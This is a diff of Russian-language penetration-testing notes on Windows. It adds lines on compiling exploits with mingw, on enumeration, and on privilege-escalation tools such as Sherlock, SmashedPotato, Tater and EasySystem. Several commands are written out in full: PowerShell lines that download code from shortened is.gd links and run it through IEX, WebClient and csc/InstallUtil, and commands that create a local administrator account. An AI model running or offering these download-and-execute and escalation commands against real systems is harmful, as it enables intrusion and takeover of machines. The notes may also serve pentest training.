@@ -1,5 +1,8 @@
 
         Windows
+                Важненько, вот компиляция сплоитов под винду на лине, тулза mingw‐w64 (i686‐w64‐mingw32‐gcc 40564.c –o exploit.exe –lws2_32)
+        
+        
              Есть нулевые сессии для винды, и вот одно из прог (exe) которая даст инфу (http://ntsecurity.nu/toolbox/winfo/), о пользователях
              TransportEnum-тулза узнаёт через реестр винды какие она поддерживает сетевые интерфейсы
              В стандартном арсенале винды есть команда net view, сканирует сеть
@@ -78,8 +81,25 @@
                                                                                         suidshell.run("cmd.exe /c net user TEST TESTPWD /add", 0);
 
 
-                Тулза beroot используется для повышения привилегий (exe)
+                Тулза beroot используется для повышения привилегий (exe) (https://howucan.gr/scripts-tools/2049-beroot-windows-privilege-escalation-tool)
+                Powershell скрипт для проверки патчей на дыры Sherlock (https://github.com/rasta-mouse/Sherlock) (import-module ./Sherlock.ps1)
+                Вот еще один инструмент для PLE но это пообширнее, проверяет всё до чего может дотянуться (https://github.com/pentestmonkey/windows-privesc-check/) (windows-privesc-check2.exe --audit -a -o -report)
+                SmashedPotato, тоже тулза для те же вещей, является адгрейдом классики Hot Potato (https://github.com/Cn33liz/SmashedPotato)  x64 ->             (powershell ‐ExecutionPolicy Bypass ‐noLogo ‐Command (new‐object
+                         Но тут оговорочка, для 7 и нише всё шикорно, правда выше уже сложности, тут придется ждать максимум сутки, и работает он на .NET         System.Net.WebClient).DownloadFile('http://is.gd/y6cfKV','%temp%\
+                                                                                                                                                                  SmashedPotato.cs'); && cd c:\Windows\Microsoft.NET\Framework64\v4.* &
+                                                                                                                                                                  & csc.exe /out:"%temp%\SmashedPotatoX64.exe" /platform:x64 "%temp%\
+                                                                                                                                                                  SmashedPotato.cs" && InstallUtil.exe /logfile= /LogToConsole=false /U
+                                                                                                                                                                  %temp%\SmashedPotatoX64.exe  )
                 
+               Tater, тот же Картошка, но на Powershell (https://github.com/Kevin-Robertson/Tater) (  powershell "IEX (New‐Object Net.WebClient).DownloadString('http://is.
+                                                                                                      gd/fVC1Yd'); Invoke‐Tater ‐Trigger 1 ‐Command ""net user User1 Passwo
+                                                                                                      rd1 /add && net localgroup administrators User1 /add""" )
+                       После чего в системе появит ся пользователь User1 с паролем Password1 ,входящий в группу  администраторов. Но надо отметить, что для Windows 10 следует использовать ключ ‐Trigger 2 
+                                                                                                               
+                
+                
+               С локального админа до системы-изи с EasySystem (https://github.com/Cn33liz/EasySystem) просто exe-шник, запустил и система, работает по имперсонации
+               
 
              
 
